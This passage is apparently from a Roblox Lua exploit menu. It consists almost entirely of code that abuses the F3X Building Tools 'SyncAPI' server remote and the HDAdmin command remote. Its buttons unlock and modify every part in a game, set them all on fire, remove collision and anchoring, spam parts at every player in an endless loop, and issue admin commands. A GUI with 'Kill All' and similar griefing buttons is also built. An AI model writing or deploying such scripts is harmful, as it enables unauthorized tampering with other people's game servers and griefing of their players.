						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("158118263")

-----------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
		function FireParts()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					AddFire(v)
				end)
			end
		end
		FireParts()
		
--------------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
		function Neon()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					Material(v,Enum.Material.Neon)
				end)
			end
		end
		Neon()
		


end)



MainSection5:NewButton("Visible Parts (F3X)","", function()
	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

function Parts()

		for i,v in game.Workspace:GetDescendants() do

		if v.Name ~= "HumanoidRootPart" then

			spawn(function()

					SetLocked(v,false)

					SetTrans(v,0)

			end)

		end

end

end

Parts()

end)



MainSection5:NewButton("Disable Part Collision (F3X)","", function()

local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

function Parts()

		for i,v in game.Workspace:GetDescendants() do

			spawn(function()

					SetLocked(v,false)

					SetCollision(v,false)

			end)

		end

	end

	Parts()

end)



MainSection5:NewButton("UnAnchor Parts (F3X)","", function()

local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

function Parts()

		for i,v in game.Workspace:GetDescendants() do

			spawn(function()

					SetLocked(v,false)

					SetAnchor(v,false)

			end)

		end

	end

	Parts()

end)


MainSection5:NewToggle("Disco", "", function(state)

if state then

local args = {

    [1] = ";disco"

}



game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))

else

local args = {

    [1] = ";undisco"

}



game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))

end

end)



MainSection5:NewButton("Create weird teams", "", function()

local args = {

    [1] = ";createteam a"

}



game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))

local args = {

    [1] = ";createteam red"

}



game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))

local args = {

    [1] = ";createteam blue"

}



game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))

local args = {

    [1] = ";createteam yellow"

}



game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))

local args = {

    [1] = ";createteam green"

}



game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))

end)



MainSection5:NewButton("Part Spam", "", function()

local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

function Parts()

for i,v in pairs(game.Players:GetChildren()) do

			spawn(function()

e = v.HumanoidRootPart.CFrame.x

f = v.HumanoidRootPart.CFrame.y

g = v.HumanoidRootPart.CFrame.z

CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)),workspace)

		end)

end

end

while true do

spawn(function()

Parts()

end)

wait()

end

end)



MainSection5:NewButton("F3X Replication Gui","", function()

-- Gui to Lua

-- Version: 3.2



-- Instances:



local ReplicationGui = Instance.new("ScreenGui")

local Frame = Instance.new("Frame")

local Frame_2 = Instance.new("Frame")

local Buttons = Instance.new("Folder")

local ScrollingFrame = Instance.new("ScrollingFrame")

local BigHead = Instance.new("TextButton")

local BumAll = Instance.new("TextButton")

local Colorall = Instance.new("TextButton")

local DecalSpam = Instance.new("TextButton")

local Duckify = Instance.new("TextButton")

local FireAll = Instance.new("TextButton")

local Luigirain = Instance.new("TextButton")

local RainToad = Instance.new("TextButton")

local ThomasEngine = Instance.new("TextButton")

local Unanchor = Instance.new("TextButton")

local BasePlate = Instance.new("TextButton")

local KillAll = Instance.new("TextButton")

local Personalityall = Instance.new("TextButton")

local SkyBox = Instance.new("TextButton")

local Peircer = Instance.new("TextButton")

local StickAll = Instance.new("TextButton")

local TwigAll = Instance.new("TextButton")

local FireParts = Instance.new("TextButton")

local Frame_3 = Instance.new("Frame")

local ImageLabel = Instance.new("ImageLabel")

local TextLabel = Instance.new("TextLabel")



--Properties:



ReplicationGui.Name = "ReplicationGui"

ReplicationGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

ReplicationGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ReplicationGui.ResetOnSpawn = false



Frame.Parent = ReplicationGui

Frame.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

Frame.BorderSizePixel = 0

Frame.Position = UDim2.new(0.237454101, 0, 0.242971882, 0)

Frame.Size = UDim2.new(0, 395, 0, 274)



Frame_2.Parent = Frame

Frame_2.BackgroundColor3 = Color3.fromRGB(255, 119, 29)

Frame_2.BorderSizePixel = 0

Frame_2.Position = UDim2.new(0, 0, -9.50611429e-05, 0)

Frame_2.Size = UDim2.new(0, 395, 0, 24)

Frame_2.ZIndex = 2



Buttons.Name = "Buttons"

Buttons.Parent = Frame



ScrollingFrame.Parent = Buttons

ScrollingFrame.Active = true

ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

ScrollingFrame.BackgroundTransparency = 1.000

ScrollingFrame.BorderSizePixel = 0

ScrollingFrame.Position = UDim2.new(0, 0, 0.0582990982, 0)

ScrollingFrame.Size = UDim2.new(0, 395, 0, 258)



BigHead.Name = "BigHead"

BigHead.Parent = ScrollingFrame

BigHead.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

BigHead.BorderSizePixel = 0

BigHead.Position = UDim2.new(0, 0, 0.0323792323, 0)

BigHead.Size = UDim2.new(0, 123, 0, 43)

BigHead.AutoButtonColor = false

BigHead.Font = Enum.Font.Code

BigHead.TextColor3 = Color3.fromRGB(255, 255, 255)

BigHead.TextSize = 20.000

BigHead.TextWrapped = true



BumAll.Name = "Bum All"

BumAll.Parent = ScrollingFrame

BumAll.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

BumAll.BorderSizePixel = 0

BumAll.Position = UDim2.new(0.341772139, 0, 0.244879276, 0)

BumAll.Size = UDim2.new(0, 123, 0, 43)

BumAll.AutoButtonColor = false

BumAll.Font = Enum.Font.Code

BumAll.TextColor3 = Color3.fromRGB(255, 255, 255)

BumAll.TextSize = 20.000

BumAll.TextWrapped = true



Colorall.Name = "Color all"

Colorall.Parent = ScrollingFrame

Colorall.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

Colorall.BorderSizePixel = 0

Colorall.Position = UDim2.new(0.344303787, 0, 0.137131482, 0)

Colorall.Size = UDim2.new(0, 123, 0, 43)

Colorall.AutoButtonColor = false

Colorall.Font = Enum.Font.Code

Colorall.TextColor3 = Color3.fromRGB(255, 255, 255)

Colorall.TextSize = 20.000

Colorall.TextWrapped = true



DecalSpam.Name = "Decal Spam"

DecalSpam.Parent = ScrollingFrame

DecalSpam.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

DecalSpam.BorderSizePixel = 0

DecalSpam.Position = UDim2.new(0.686075926, 0, 0.244879276, 0)

DecalSpam.Size = UDim2.new(0, 123, 0, 43)

DecalSpam.AutoButtonColor = false

DecalSpam.Font = Enum.Font.Code

DecalSpam.TextColor3 = Color3.fromRGB(255, 255, 255)

DecalSpam.TextSize = 20.000

DecalSpam.TextWrapped = true



Duckify.Name = "Duckify"

Duckify.Parent = ScrollingFrame

Duckify.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

Duckify.BorderSizePixel = 0

Duckify.Position = UDim2.new(0, 0, 0.137131482, 0)

Duckify.Size = UDim2.new(0, 123, 0, 43)

Duckify.AutoButtonColor = false

Duckify.Font = Enum.Font.Code

Duckify.TextColor3 = Color3.fromRGB(255, 255, 255)

Duckify.TextSize = 20.000

Duckify.TextWrapped = true



FireAll.Name = "Fire All"

FireAll.Parent = ScrollingFrame

FireAll.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

FireAll.BorderSizePixel = 0

FireAll.Position = UDim2.new(0.688607574, 0, 0.0323792323, 0)

FireAll.Size = UDim2.new(0, 123, 0, 43)

FireAll.AutoButtonColor = false

FireAll.Font = Enum.Font.Code

FireAll.TextColor3 = Color3.fromRGB(255, 255, 255)

FireAll.TextSize = 20.000

FireAll.TextWrapped = true



Luigirain.Name = "Luigi rain"

Luigirain.Parent = ScrollingFrame

Luigirain.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

Luigirain.BorderSizePixel = 0

Luigirain.Position = UDim2.new(0.344303787, 0, 0.0323792323, 0)

Luigirain.Size = UDim2.new(0, 123, 0, 43)

Luigirain.AutoButtonColor = false

Luigirain.Font = Enum.Font.Code

Luigirain.TextColor3 = Color3.fromRGB(255, 255, 255)

Luigirain.TextSize = 20.000

Luigirain.TextWrapped = true



RainToad.Name = "Rain Toad"

RainToad.Parent = ScrollingFrame

RainToad.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

RainToad.BorderSizePixel = 0

RainToad.Position = UDim2.new(-0.00253164559, 0, 0.244879276, 0)

RainToad.Size = UDim2.new(0, 123, 0, 43)

RainToad.AutoButtonColor = false

RainToad.Font = Enum.Font.Code

RainToad.TextColor3 = Color3.fromRGB(255, 255, 255)

RainToad.TextSize = 20.000

RainToad.TextWrapped = true



ThomasEngine.Name = "Thomas Engine"

ThomasEngine.Parent = ScrollingFrame

ThomasEngine.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

ThomasEngine.BorderSizePixel = 0

ThomasEngine.Position = UDim2.new(0.688607574, 0, 0.137131482, 0)

ThomasEngine.Size = UDim2.new(0, 123, 0, 43)

ThomasEngine.AutoButtonColor = false

ThomasEngine.Font = Enum.Font.Code

